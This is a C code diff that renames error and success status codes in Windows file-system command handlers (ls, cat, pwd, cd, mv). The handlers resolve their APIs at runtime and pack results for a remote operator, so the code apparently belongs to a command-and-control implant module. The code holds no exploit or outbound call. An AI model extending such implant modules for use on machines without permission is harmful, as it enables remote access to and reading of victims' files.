@@ -8,6 +8,15 @@
 #define DO_CD  6
 
 
+#define PARSER_LS 102
+
+
+// succes 200-249
+#define CP_SUCCESS 200
+#define MV_SUCCESS 201
+
+// errors 250-299
+#define CAT_ERROR_NOT_FILE 250
 
 
 typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFIleData);
@@ -50,7 +59,7 @@ SEC_B void do_ls(PModule mod) {
 	WIN32_FIND_DATAA fData = { 0 };
 	HANDLE hFind = fnFindFirstFileA( path, &fData );
 	if ( !hFind || hFind == INVALID_HANDLE_VALUE ) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_WIN32_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
 		goto CLEANUP;
 	}
@@ -121,14 +130,14 @@ SEC_B void do_cat(PModule mod) {
 	Attrs = fnGetFileAttributesA((PCHAR)file);
 	isFile = (Attrs != INVALID_FILE_ATTRIBUTES && !(Attrs & FILE_ATTRIBUTE_DIRECTORY));
 	if (!isFile) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_MODULE_ERROR );
 		mod->ModulePack4( CAT_ERROR_NOT_FILE);
 		goto CLEANUP;
 	}
 
 	hFile = fnCreateFileA((PCHAR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_WIN32_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
 		goto CLEANUP;
 	}
@@ -136,7 +145,7 @@ SEC_B void do_cat(PModule mod) {
 
 	res = fnReadFile(hFile, buf, ChunkSize, &BytesRead, NULL);
 	if (!res) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_WIN32_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
 		goto CLEANUP;
 	}
@@ -164,7 +173,7 @@ SEC_B void do_pwd(PModule mod) {
 
 	DWORD res = fnGetCurrentDirectoryA( size, ( PCHAR )pwd );
 	if( res == 0 || res >= size ) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_WIN32_ERROR );
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
 		goto CLEANUP;
 	}
@@ -188,12 +197,12 @@ SEC_B void do_cd(PModule mod) {
 	PBYTE path   = mod->ModuleUnpackBytes(pathLen);
 
 	if( ! fnSetCurrentDirectoryA(( PCHAR )path)) {
-	    mod->ModulePack4(OUTPUT_ERROR);
+	    mod->ModulePack4(OUTPUT_WIN32_ERROR);
 		mod->ModulePack4( ( INT32 )fnGetLastError( ));
 		goto CLEANUP;
 	}
 
-     mod->ModulePack4(OUTPUT_SUCCESS);
+     mod->ModulePack4(OUTPUT_MODULE_SUCCESS);
      mod->ModulePack4(CP_SUCCESS);
 
 CLEANUP:
@@ -216,12 +225,12 @@ SEC_B void do_mv(PModule mod) {
 
 
 	if( ! fnMoveFileA(f1, f2)) {
-		mod->ModulePack4( OUTPUT_ERROR );
+		mod->ModulePack4( OUTPUT_WIN32_ERROR );
 		mod->ModulePack4( ( INT32 ) fnGetLastError( ) );
 		goto CLEANUP;
 	}
 
-	 mod->ModulePack4(OUTPUT_SUCCESS);
+	 mod->ModulePack4(OUTPUT_MODULE_SUCCESS);
      mod->ModulePack4(MV_SUCCESS);
 
 
